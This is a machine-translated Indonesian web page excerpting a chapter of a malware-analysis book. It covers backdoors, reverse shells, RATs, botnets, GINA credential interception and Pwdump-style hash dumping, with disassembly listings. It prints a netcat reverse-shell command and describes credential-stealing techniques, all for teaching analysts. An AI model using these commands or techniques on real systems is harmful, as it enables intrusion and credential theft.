<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🏾 〰️ 👨‍🎓 Buku "Otopsi akan ditampilkan!" Analisis malware praktis » ☠️ 📌 👵🏾</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Analisis malware menyerupai permainan kucing dan tikus: tidak ada aturan, situasinya terus berubah. Oleh karena itu, dalam hal ini, masuk akal untuk m...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Buku "Otopsi akan ditampilkan!" Analisis malware praktis »</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/piter/blog/416143/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><img src="https://habrastorage.org/webt/jk/0g/rv/jk0grvjx0tqi91gqj9v6qmsqahs.jpeg" align="left" alt="gambar"></a>  Analisis malware menyerupai permainan kucing dan tikus: tidak ada aturan, situasinya terus berubah.  Oleh karena itu, dalam hal ini, masuk akal untuk mempelajari hanya hal-hal dan algoritma yang abadi.  Segera setelah Anda dihadapkan dengan tugas melindungi jaringan (atau seribu jaringan), Anda melanjutkan ke analisis semacam itu, dan Anda tidak dapat melakukannya tanpa buku ini. <br><br><h3>  Program untuk mengunduh dan menjalankan perangkat lunak </h3><br>  Ada dua jenis malware yang sering ditemukan yang dirancang untuk mengunduh dan menjalankan perangkat lunak.  Pengunduh (jangan bingung dengan pengunduh sistem) cukup unduh kode berbahaya tambahan dari Internet dan jalankan di komputer lokal.  Mereka sering didistribusikan bersama dengan exploit.  Mereka biasanya menggunakan dua panggilan Windows API, satu demi satu, untuk mengunduh dan mengeksekusi malware tambahan: URLDownloadtoFileA dan WinExec. <br><a name="habracut"></a><br>  Peluncur (peluncur) adalah file yang dapat dieksekusi yang menginstal aplikasi jahat untuk eksekusi tersembunyi mereka (segera atau setelah beberapa waktu).  Peluncur sering datang dengan perangkat lunak yang mereka butuhkan untuk dijalankan.  Kami akan membahasnya di bab 12. <br><br><h4>  Backdoors </h4><br>  Backdoors adalah program yang memberikan penyerang akses ke komputer korban.  Mereka adalah jenis malware yang paling terdeteksi, dan ukuran serta set fiturnya dapat sangat bervariasi.  Kode backdoor biasanya mandiri dan tidak perlu mengunduh file yang terinfeksi tambahan. <br><br>  Backdoors berinteraksi melalui Internet dalam banyak cara berbeda, tetapi data biasanya ditransmisikan melalui HTTP melalui port 80. HTTP membentuk sebagian besar lalu lintas jaringan keluar, yang memberikan malware peluang besar untuk tidak diketahui dengan latar belakang informasi lain. <br><br>  Dalam Bab 14, Anda akan belajar bagaimana menganalisis backdoors di tingkat paket, menciptakan tanda tangan jaringan yang efektif.  Sementara itu, kami akan fokus pada interaksi tingkat tinggi. <br>  Backdoors dilengkapi dengan serangkaian fungsi standar: kemampuan untuk memanipulasi kunci registri, menghitung jendela yang ditampilkan, membuat direktori, mencari file, dll. Untuk memahami yang mana yang digunakan oleh pintu belakang, Anda dapat memeriksa fungsi Windows API mana yang diimpornya.  Lampiran A memberikan daftar fungsi umum yang menjelaskan apa yang dapat mereka katakan tentang malware. <br><br><h3>  Membalik Perintah Shell </h3><br>  Shell perintah terbalik adalah koneksi yang menginisiasi komputer yang terinfeksi, memberikan akses perintah ke penyerang.  Ini bisa berupa program jahat yang terpisah, atau salah satu komponen dari backdoor yang lebih kompleks.  Sementara di shell perintah terbalik, penyerang dapat mengeksekusi perintah seolah-olah semua ini terjadi pada sistem lokalnya. <br><br><h4>  Netcat Reverse Command Shell </h4><br>  Program Netcat yang kita bahas pada Bab 3 dapat digunakan untuk membuat shell perintah jika Anda menjalankannya di dua komputer.  Penyerang sering menggunakannya sendiri, serta melengkapinya dengan malware lain. <br>  Untuk menggunakan Netcat, sistem jarak jauh harus menunggu koneksi masuk menggunakan perintah berikut: <br><br><pre><code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nc</span></span> -l –p <span class="hljs-number"><span class="hljs-number">80</span></span></code> </pre> <br>  Saklar -l mengalihkan Netcat ke mode mendengarkan, dan sakelar -p menentukan port yang dimonitor.  Selanjutnya, komputer korban memulai koneksi keluar dan menyediakan shell perintahnya: <br><br><pre> <code class="hljs dos">nc _ip <span class="hljs-number"><span class="hljs-number">80</span></span> -e <span class="hljs-built_in"><span class="hljs-built_in">cmd</span></span>.exe</code> </pre> <br>  pendengar ip 80 adalah alamat IP dan port dari host jarak jauh.  Opsi -e memungkinkan Anda menentukan program yang akan dijalankan saat koneksi dibuat.  Input dan output standarnya akan terikat ke soket (seperti yang akan Anda lihat nanti, Windows sering menggunakan cmd.exe). <br><br><h4>  Membalikkan Shell Windows </h4><br>  Penyerang menggunakan dua implementasi shell perintah reverse berbasis cmd.exe sederhana di Windows: dasar dan multi-berulir. <br><br>  Metode dasar ini populer di kalangan penulis malware, karena lebih mudah diterapkan dan umumnya bekerja tidak lebih buruk daripada pendekatan multi-utas.  Ini didasarkan pada pemanggilan CreateProcess dan mengubah struktur STARTUPINFO yang diteruskan ke sana.  Pertama, soket dibuat dan koneksi dibuat dengan server jarak jauh.  Kemudian soket ini dilampirkan ke utas standar (input, output dan aliran kesalahan) dari proses cmd.exe.  CreateProcess menjalankan cmd.exe dalam mode tanpa jendela untuk menyembunyikannya dari korban.  Bab 7 memberikan contoh teknik ini. <br><br>  Versi multi-threaded dari shell perintah balik Windows menyiratkan membuat soket, dua pipa dan dua utas (karena itu, Anda harus mencari panggilan CreateThread dan CreatePipe).  Metode ini kadang-kadang digunakan oleh penulis malware sebagai bagian dari strategi untuk memodifikasi atau menyandikan data yang dikirimkan melalui soket.  Fungsi CreatePipe dapat digunakan untuk mengikat ke saluran membaca dan menulis, seperti input standar (stdin) dan output standar (stdout).  Fungsi CreateProcess memungkinkan Anda untuk mengikat utas standar ke saluran, dan tidak langsung ke soket.  Setelah dipanggil, malware akan membuat dua utas eksekusi: satu untuk membaca dari saluran stdin dan menulis ke soket, dan yang lainnya untuk membaca dari soket dan menulis ke saluran stdout.  Biasanya, utas ini menyandikan data, yang akan kita bahas di Bab 13. Menggunakan metode rekayasa terbalik, Anda dapat memeriksa cabang-cabang di mana stream mendekode paket yang diterima selama sesi terenkripsi. <br><br><h3>  Alat Administrasi Jarak Jauh </h3><br>  Alat administrasi jarak jauh (RAT) digunakan untuk mengontrol komputer atau komputer melalui jaringan.  Mereka sering terlibat dalam serangan yang ditargetkan secara sempit - misalnya, ketika mencuri informasi atau pindah dari komputer ke komputer. <br><br>  Dalam gbr.  11.1 menunjukkan struktur jaringan RAT.  Server yang berjalan pada sistem korban dilengkapi dengan kode berbahaya.  Klien bekerja jarak jauh karena modul kontrol siap digunakan penyerang.  Server memberi sinyal klien yang mengontrol mereka untuk memulai koneksi.  Interworking dalam RAT biasanya terjadi melalui port standar, seperti 80 atau 443. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/kj/7f/px/kj7fpxqhevkd2db817n4rjulxuu.png" alt="gambar"></div><br><h3>  Botnet </h3><br>  Botnet adalah kumpulan node jaringan yang terinfeksi (zombie) yang dikelola secara terpusat, biasanya menggunakan server yang disebut pengontrol botnet.  Tujuan botnet adalah untuk menginfeksi sebanyak mungkin komputer dan membuat jaringan berskala besar berdasarkan pada mereka yang dapat digunakan baik untuk menyebarkan malware atau spam lain, dan untuk melakukan serangan DDoS (distribusi penolakan layanan). )  Jika semua zombie pada saat yang sama mulai menyerang situs tertentu, itu bisa menjadi tidak dapat diakses. <br><br><h3>  Perbandingan RAT dan Botnet </h3><br>  Ada beberapa perbedaan penting antara botnet dan alat administrasi jarak jauh. <br><br><ul><li>  Botnet diketahui menginfeksi dan mengontrol jutaan node.  RAT biasanya dijalankan oleh komputer yang jauh lebih sedikit. </li><li>  Semua peserta botnet dikelola secara bersamaan.  RAT memungkinkan Anda untuk mendistribusikan sumber daya di antara korban yang berbeda, karena penyerang memiliki kemampuan untuk berinteraksi lebih dekat dengan sistem yang terinfeksi. </li><li>  RAT digunakan dalam serangan bertarget sempit, sementara botnet terkenal karena jumlah besar mereka. </li></ul><br><h3>  Pencurian kredensial </h3><br>  Penyerang sering melakukan segala macam trik untuk mencuri kredensial.  Ini terutama berlaku untuk ketiga jenis malware. <br><br><ul><li>  Program yang mencuri kredensial pengguna pada saat ia masuk ke sistem. </li><li>  Program yang menyalin informasi yang disimpan di Windows (kata sandi, hash, dll.) Untuk penggunaan langsung atau dekripsi lebih lanjut. </li><li>  Program yang merekam penekanan tombol. </li></ul><br>  Di bagian ini, kami melihat masing-masing jenis malware ini. <br><br><h3>  Intersepsi GINA </h3><br>  Windows XP menggunakan trik untuk mencuri kredensial, yang terdiri dari mencegat GINA (identifikasi grafis dan otentikasi).  Sistem GINA dibuat untuk memungkinkan aplikasi pihak ketiga untuk mengadaptasi proses login untuk diri mereka sendiri, menambahkan dukungan untuk teknologi seperti identifikasi frekuensi radio (RFID) berdasarkan token atau kartu pintar.  Penulis malware mengambil kesempatan ini untuk mengunduh kode yang mencuri kredensial. <br><br>  GINA diimplementasikan sebagai DLL yang disebut msgina.dll dan dimuat oleh Winlogon saat login.  Winlogon juga mendukung plugin pihak ketiga, memuatnya di depan GINA DLL (seperti dalam serangan perantara).  Untuk kenyamanan, Windows menyediakan cabang registri berikut, tempat Winlogon dapat menemukan dan memuat DLL pihak ketiga: <br><br><pre> <code class="hljs tex">HKLM<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SOFTWARE</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Microsoft</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Windows</span></span></span></span> NT<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">CurrentVersion</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Winlogon</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">GinaDLL</span></span></span></span></code> </pre> <br>  Setelah kami menemukan file fsgina.dll yang terinfeksi di sana, yang ternyata merupakan pencegat GINA. <br>  Dalam gbr.  Gambar 11.2 menunjukkan contoh bagaimana informasi masuk ke perpustakaan jahat, beralih dari Winlogon ke msgina.dll.  Malware (fsgina.dll) berhasil mencegat semua kredensial yang dimasukkan pengguna selama otentikasi.  Ia dapat menulisnya ke disk atau mentransfer melalui jaringan. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ge/eh/ma/geehmaneqdvfmxkmq9-8drvs5cc.png" alt="gambar"></div><br>  Karena pustaka fsgina.dll memotong aliran interaksi antara Winlogon dan GINA, itu harus meneruskannya lebih lanjut ke msgina.dll sehingga sistem terus berfungsi secara normal.  Untuk melakukan ini, malware harus mengekspor semua fungsi yang diperlukan sistem GINA - ada lebih dari 15 di antaranya, dan kebanyakan dari mereka memiliki awalan WX.  Jelas, jika Anda menemukan di DLL banyak fungsi ekspor yang dimulai dengan WX, Anda kemungkinan besar dapat berasumsi bahwa ini adalah pencegat GINA. <br><br>  Sebagian besar panggilan ekspor ini mengakses fungsi nyata di dalam msgina.dll.  Dalam kasus fsgina.dll, ini berlaku untuk semua fungsi kecuali WlxLoggedOutSAS.  Listing 11.1 menunjukkan ekspor WlxLoggedOutSAS ke fsgina.dll. <br><br>  Listing 11.1.  Fungsi ekspor WlxLoggedOutSAS di DLL GINA yang mencatat kredensial curian <br><br><pre> <code class="hljs powershell"><span class="hljs-number"><span class="hljs-number">100014</span></span>A0 WlxLoggedOutSAS <span class="hljs-number"><span class="hljs-number">100014</span></span>A0 push esi <span class="hljs-number"><span class="hljs-number">100014</span></span>A1 push edi <span class="hljs-number"><span class="hljs-number">100014</span></span>A2 push offset aWlxloggedout_0 ; <span class="hljs-string"><span class="hljs-string">"WlxLoggedOutSAS"</span></span> <span class="hljs-number"><span class="hljs-number">100014</span></span>A7 call Call_msgina_dll_<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(1)</span></span></span><span class="hljs-function"> ... </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">100014FB</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">eax</span></span></span><span class="hljs-function"> ; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Args</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">100014FC</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">offset</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aUSDSPSOpS</span></span></span><span class="hljs-function"> ;"</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">U</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">D</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">P</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">OP</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function">" </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">10001501</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">offset</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aDRIVERS</span></span></span><span class="hljs-function"> ; "</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">drivers</span></span></span><span class="hljs-function">\</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">tcpudp</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sys</span></span></span><span class="hljs-function">" </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">10001503</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">call</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Log_To_File</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(2)</span></span></span></span></code> </pre> <br>  Informasi kredensial segera ditransfer ke file msgina.dll menggunakan panggilan yang ditunjuk sebagai Call_msgina_dll_function (1).  Fungsi ini secara dinamis mencari dan meluncurkan panggilan WlxLoggedOutSAS dari msgina.dll, yang ditentukan sebagai argumen.  Panggilan on line (2) merekam data.  Sebagai argumen, dibutuhkan informasi akuntansi, string format yang dengannya informasi ini akan ditampilkan, dan nama file untuk direkam.  Akibatnya, informasi tentang setiap login yang berhasil disimpan ke file% SystemRoot% \ system32 \ drivers \ tcpudp.sys.  File ini berisi nama pengguna, domain dan dua kata sandi - saat ini dan yang lama. <br><br><h3>  Menyimpan Hash </h3><br>  Perangkat lunak berbahaya pada Windows seringkali menyimpan hash sistem untuk mendapatkan akses ke kredensial.  Setelah menyimpan, penyerang mencoba mendekripsi hash ini secara offline atau menggunakannya untuk menyerang seperti pass-the-hash.  Selama serangan ini, hash LM dan NTLM digunakan untuk otentikasi NTLM jarak jauh, yang tidak memerlukan dekripsi dan memperoleh kata sandi yang sesuai. <br><br>  Untuk menyimpan hash, ada paket perangkat lunak Pwdump dan Pass-the-Hash (PSH) yang gratis.  Karena kedua alat ini adalah open source, banyak malware telah dibuat atas dasar mereka. <br><br>  Sebagian besar antivirus memiliki tanda tangan untuk versi kompilasi standar dari utilitas ini, sehingga penyerang sering mencoba untuk mengkompilasi variasi mereka sendiri untuk menghindari deteksi.  Contoh dalam bab ini adalah jenis pwdump dan PSH yang kita temui dalam kehidupan nyata. <br><br>  Pwdump adalah seperangkat program yang menghasilkan hash dalam format LM i NTLM milik pengguna lokal dari manajer akun keamanan (SAM).  Pwdump menyuntikkan DLL ke dalam proses LSASS (layanan subsistem otoritas keamanan lokal), lebih dikenal sebagai lsass.exe.  Kami akan membahas implementasi DLL di bab 12, tetapi untuk saat ini, Anda hanya perlu tahu bahwa ini adalah teknik yang digunakan malware untuk mengeksekusi perpustakaan di dalam proses lain, menggunakan semua hak istimewa mereka.  Alat untuk menyimpan hash sering menyerang proses lsass.exe karena memiliki hak istimewa yang cukup dan akses ke banyak fungsi API yang berguna. <br><br>  Versi standar Pwdump menggunakan perpustakaan lsaext.dll.  Ketika disuntikkan ke lsass.exe, ia memanggil fungsi GetHash, yang diekspor dari lsaext.dll untuk mengambil hash.  Pada saat yang sama, fungsi Windows tidak berdokumen digunakan, yang akan memungkinkan untuk mendapatkan nomor seri dari semua pengguna dalam sistem dan hash yang tidak terenkripsi dari kata sandi masing-masing. <br><br>  Menghadapi variasi Pwdump, Anda perlu menganalisis perpustakaannya untuk memahami bagaimana hash disimpan.  Hal pertama yang harus Anda perhatikan adalah fungsi ekspor.  Panggilan GetHash diekspor dari Pwdump secara default, tetapi penyerang dapat dengan mudah mengubah namanya agar kurang dikenali.  Maka Anda harus mencoba menentukan fungsi yang digunakan dalam panggilan ekspor.  Banyak dari mereka dapat ditemukan secara dinamis, oleh karena itu, panggilan ekspor sering menggunakan kembali operasi GetProcAddress. <br><br>  Listing 11.2 memperlihatkan kode fungsi ekspor GrabHash dari DLL dari satu versi Pwdump.  Karena perpustakaan tertanam dalam lsass.exe, sebelum menggunakan banyak karakter, pertama-tama harus menemukannya dalam mode manual. <br><br>  Listing 11.2.  Panggilan API unik yang digunakan oleh fungsi ekspor GrabHash di salah satu varian Pwdump <br><br><pre> <code class="hljs perl"><span class="hljs-number"><span class="hljs-number">1000123</span></span>F <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset LibFileName ; <span class="hljs-string"><span class="hljs-string">"samsrv.dll"</span></span> (<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-number"><span class="hljs-number">10001244</span></span> call esi ; LoadLibraryA <span class="hljs-number"><span class="hljs-number">10001248</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aAdvapi32_dll_<span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-string"><span class="hljs-string">"advapi32.dll"</span></span> (<span class="hljs-number"><span class="hljs-number">2</span></span>) ... <span class="hljs-number"><span class="hljs-number">10001251</span></span> call esi ; LoadLibraryA ... <span class="hljs-number"><span class="hljs-number">1000125</span></span>B <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset ProcName ; <span class="hljs-string"><span class="hljs-string">"SamIConnect"</span></span> <span class="hljs-number"><span class="hljs-number">10001260</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">10001265</span></span> call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">10001281</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSamrqu ; <span class="hljs-string"><span class="hljs-string">"SamrQueryInformationUser"</span></span> <span class="hljs-number"><span class="hljs-number">10001286</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">1000128</span></span>C call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">100012</span></span>C2 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSamigetpriv ; <span class="hljs-string"><span class="hljs-string">"SamIGetPrivateData"</span></span> <span class="hljs-number"><span class="hljs-number">100012</span></span>C7 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>CD call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">100012</span></span>CF <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSystemfuncti ; <span class="hljs-string"><span class="hljs-string">"SystemFunction025"</span></span> (<span class="hljs-number"><span class="hljs-number">3</span></span>) <span class="hljs-number"><span class="hljs-number">100012</span></span>D4 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>DA call esi ; GetProcAddress <span class="hljs-number"><span class="hljs-number">100012</span></span>DC <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSystemfuni_<span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-string"><span class="hljs-string">"SystemFunction027"</span></span> (<span class="hljs-number"><span class="hljs-number">4</span></span>) <span class="hljs-number"><span class="hljs-number">100012</span></span>E1 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>E7 call esi ; GetProcAddress</code> </pre> <br>  Listing 11.2 memperlihatkan kode untuk mengambil deskriptor pustaka samsrv.dll (1) dan advapi32.dll (2) dengan memanggil LoadLibrary.  File samsrv.dll berisi API untuk akses mudah ke SAM, dan file advapi32.dll ditemukan untuk mengakses fungsi-fungsi yang tidak diimpor ke lsass.exe.  Pustaka dinamis dari variasi ini Pwdump menggunakan deskriptor pustaka ini untuk mencari banyak fungsi.  Lima yang paling penting ditunjukkan dalam daftar (perhatikan panggilan GetProcAddress dan argumennya). <br><br>  Panggilan yang menarik seperti SamIConnect, SamrQueryInformationUser, dan SamIGetPrivateData diimpor dari samsrv.dll.  Panggilan SamIConnect selanjutnya digunakan untuk terhubung ke SAM, setelah itu fungsi SamrQueryInformationUser dipanggil untuk setiap pengguna dalam sistem. <br><br>  Hash diambil menggunakan panggilan SamIGetPrivateData, dan kemudian didekripsi menggunakan fungsi SystemFunction025 dan SystemFunction027 yang diimpor dari advapi32.dll (baris (2) dan (3)).  Tidak ada fungsi API dalam daftar ini yang dijelaskan dalam dokumentasi resmi. <br><br>  PSH Toolkit berisi program yang membuat hash dumps.  Yang paling populer dari dump ini dikenal sebagai whosthere-alt.  Ini menyimpan konten SAM yang diperoleh dengan menyematkan DLL di lsass.exe.  Pada saat yang sama, bila dibandingkan dengan Pwdump, serangkaian fungsi API yang sama sekali berbeda digunakan.  Listing 11.3 memperlihatkan kode versi untuk whosthere-alt, yang mengekspor fungsi yang disebut TestDump. <br><br>  Listing 11.3.  Panggilan API unik yang digunakan oleh fungsi ekspor TestDump versi whosthere-alt <br><br><pre> <code class="hljs sql">10001119 push offset LibFileName ; "secur32.dll" 1000111E <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:LoadLibraryA <span class="hljs-number"><span class="hljs-number">10001130</span></span> push <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> ProcName ; "LsaEnumerateLogonSessions" 10001135 push esi ; hModule 10001136 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetProcAddress (<span class="hljs-number"><span class="hljs-number">1</span></span>) ... <span class="hljs-number"><span class="hljs-number">10001670</span></span> <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetSystemDirectoryA <span class="hljs-number"><span class="hljs-number">10001676</span></span> mov edi, <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> aMsv1_0_dll ; \\msv1_0.dll ... 100016A6 push eax ; path to msv1_0.dll 100016A9 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetModuleHandleA (<span class="hljs-number"><span class="hljs-number">2</span></span>)</code> </pre> <br>  Karena pustaka ini tertanam di lsass.exe, fungsi TestDump-nya membuat dump hash.  Ini secara dinamis memuat file secur32.dll dan menemukan LsaEnumerateLogonSessions (1) memanggilnya untuk mendapatkan daftar pengidentifikasi unik lokal (LUID).  Daftar ini berisi nama dan domain yang ditunjukkan pada setiap login.  Perpustakaan melewati mereka untuk mendapatkan akses ke informasi akuntansi.  Untuk melakukan ini, menggunakan panggilan ke GetModuleHandle (2), ia mencari di dalam msv1_0.dll untuk fungsi yang tidak diekspor, NlpGetPrimaryCredential, yang memungkinkan dumping hash NT dan LM. <br><br><h3>  Tentang Penulis </h3><br>  <b>Michael Sikorski</b> adalah spesialis keamanan di Mandiant.  Dia terlibat dalam analisis malware sebagai bagian dari investigasi insiden dan merupakan konsultan pemerintah AS untuk keamanan informasi.  Michael telah mengembangkan serangkaian kursus analisis malware dan mengajarkannya kepada audiens yang beragam, termasuk FBI dan Black Hat.  Sebelum Mandiant, ia adalah seorang karyawan Laboratorium Lincoln di Massachusetts Institute of Technology dan melakukan penelitian tentang topologi jaringan pasif dan pengujian penetrasi.  Selain itu, Michael menyelesaikan program pelatihan interdisipliner tiga tahun tentang sistem dan jaringan di NSA.  Selama pelatihan, ia berpartisipasi dalam studi teknik reverse engineering dan menerima beberapa penghargaan di bidang analisis jaringan. <br><br>  <b>Andrew Honig</b> adalah pakar keamanan informasi di Departemen Pertahanan AS.  Ia mengajar analisis perangkat lunak, rekayasa terbalik, dan pemrograman untuk sistem operasi Windows (OS) di National School of Cryptography, sambil menjadi spesialis keamanan sistem informasi bersertifikat.  Karena Andrew beberapa eksploitasi nol hari untuk virtualisasi VMware, serta alat untuk mendeteksi malware inovatif, termasuk modul kernel yang terinfeksi.  Memiliki sepuluh tahun pengalaman sebagai analis di bidang keamanan komputer, ia berhak dianggap ahli dalam analisis dan interpretasi program jahat dan biasa. <br><br>  »Informasi lebih lanjut tentang buku ini dapat ditemukan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">situs web penerbit</a> <br>  » <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Isi</a> <br>  » <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Kutipan</a> <br><br>  Untuk Khabrozhiteley, diskon 20% pada kupon - <b>Otopsi akan ditampilkan</b> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id416143/">https://habr.com/ru/post/id416143/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id416131/index.html">Bagaimana menangani PD di Federasi Rusia dan tidak melanggar hukum</a></li>
<li><a href="../id416133/index.html">Pusat Data di Luar Negeri: Equinix LD8</a></li>
<li><a href="../id416135/index.html">Aplikasi GUI lebih kecil dari 1 kb</a></li>
<li><a href="../id416137/index.html">Zabbix sebagai pemindai keamanan</a></li>
<li><a href="../id416139/index.html">Otentikasi kuat sebagai bagian dari strategi GDPR</a></li>
<li><a href="../id416147/index.html">Organisasi navigasi di iOS-aplikasi menggunakan Root Controller</a></li>
<li><a href="../id416149/index.html">Pertanyaan dan Jawaban Energi Terbarukan, Bagian 1</a></li>
<li><a href="../id416151/index.html">Balon tanpa dimensi. Sihir Analisis Dimensi Utilitarian</a></li>
<li><a href="../id416153/index.html">Akankah pesawat terbang menjadi lebih andal? Pabrikan pesawat terbang memperkenalkan robot ke perusahaan</a></li>
<li><a href="../id416155/index.html">WebSockets di Angular: buat Layanan Angular untuk bekerja dengan soket web</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
